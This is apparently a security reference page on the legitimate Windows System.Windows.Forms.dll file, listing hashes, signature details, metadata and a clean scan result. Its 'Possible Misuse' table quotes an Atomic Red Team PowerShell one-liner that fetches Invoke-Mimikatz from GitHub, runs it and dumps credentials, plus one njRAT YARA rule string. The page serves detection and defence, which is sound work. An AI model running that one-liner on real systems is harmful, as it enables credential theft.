---
title: System.Windows.Forms.dll | .NET Framework
excerpt: What is System.Windows.Forms.dll?
---

# System.Windows.Forms.dll 

* File Path: `C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.8\System.Windows.Forms.dll`
* Description: .NET Framework
* Comments: Flavor=Retail


## Hashes

Type | Hash
-- | --
MD5 | `C00F4D37C973538CC588C88D40BBFFE1`
SHA1 | `EEB874C3D0615B7A2F0AF4EBE66D56FD1952C55A`
SHA256 | `2954FCCC755081997CC1083190EF40C807E376DB17EA7B4306554BC58AFEAD52`
SHA384 | `1B856E0C7C2804ACDCB36D0E340F849FE3D16D789EEC1D0177A9F720C7566A198CBA9976AEAF73A7A76CC0AF5AA9DCE2`
SHA512 | `EF5E6B1B33E2F1D82CCB03A6168BA6FA75980D98390CC8AC728AB1FC749E71BF39A2F157580025D6676569FC5359075059593A31CB5215ADFD359556C43E1BB0`
SSDEEP | `12288:AVQkIfvWp2pYn4cpEFi86OQdIxpH976ad3jveSlLv5QPzNilliUHJufGJULSo+w3:AVKvrZd6ObdTveSl75Q4llBpufIK`
IMP | `DAE02F32A21E03CE65412F6E56942DAA`
PESHA1 | `D7EB910596C0830A777FC85F6B5D379031BE8E3C`
PE256 | `021A6459D344F5A35419A505CF99922F5BFD657C2CB4EDE0CCCB9246CA0ABF23`


## Signature

* Status: Signature verified.
* Serial: `33000001519E8D8F4071A30E41000000000151`
* Thumbprint: `62009AAABDAE749FD47D19150958329BF6FF4B34`
* Issuer: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: System.Windows.Forms.dll
* Product Name: Microsoft .NET Framework
* Company Name: Microsoft Corporation
* File Version: 4.8.4084.0 built by: NET48REL1
* Product Version: 4.8.4084.0
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation.  All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/76
* VirusTotal Link: https://www.virustotal.com/gui/file/2954fccc755081997cc1083190ef40c807e376db17ea7b4306554bc58afead52/detection


## Possible Misuse

*The following table contains possible examples of `System.Windows.Forms.dll` being misused. While `System.Windows.Forms.dll` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1059.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.md) | $url='https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1';$wshell=New-Object -ComObject WScript.Shell;$reg='HKCU:\Software\Microsoft\Notepad';$app='Notepad';$props=(Get-ItemProperty $reg);[Void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms');@(@('iWindowPosY',([String]([System.Windows.Forms.Screen]::AllScreens)).Split('}')[0].Split('=')[5]),@('StatusBar',0))\|ForEach{SP $reg (Item Variable:_).Value[0] (Variable _).Value[1]};$curpid=$wshell.Exec($app).ProcessID;While(!($title=GPS\|?{(Item Variable:_).Value.id-ieq$curpid}\|ForEach{(Variable _).Value.MainWindowTitle})){Start-Sleep -Milliseconds 500};While(!$wshell.AppActivate($title)){Start-Sleep -Milliseconds 500};$wshell.SendKeys('^o');Start-Sleep -Milliseconds 500;@($url,(' '*1000),'~')\|ForEach{$wshell.SendKeys((Variable _).Value)};$res=$Null;While($res.Length -lt 2){[Windows.Forms.Clipboard]::Clear();@('^a','^c')\|ForEach{$wshell.SendKeys((Item Variable:_).Value)};Start-Sleep -Milliseconds 500;$res=([Windows.Forms.Clipboard]::GetText())};[Windows.Forms.Clipboard]::Clear();@('%f','x')\|ForEach{$wshell.SendKeys((Variable _).Value)};If(GPS\|?{(Item Variable:_).Value.id-ieq$curpid}){@('{TAB}','~')\|ForEach{$wshell.SendKeys((Item Variable:_).Value)} };@('iWindowPosDY','iWindowPosDX','iWindowPosY','iWindowPosX','StatusBar')\|ForEach{SP $reg (Item Variable:_).Value $props.((Variable _).Value)};IEX($res);invoke-mimikatz -dumpcr | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [crime_cn_campaign_njrat.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/crime_cn_campaign_njrat.yar) | $s3 = "System.Windows.Forms.Form" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


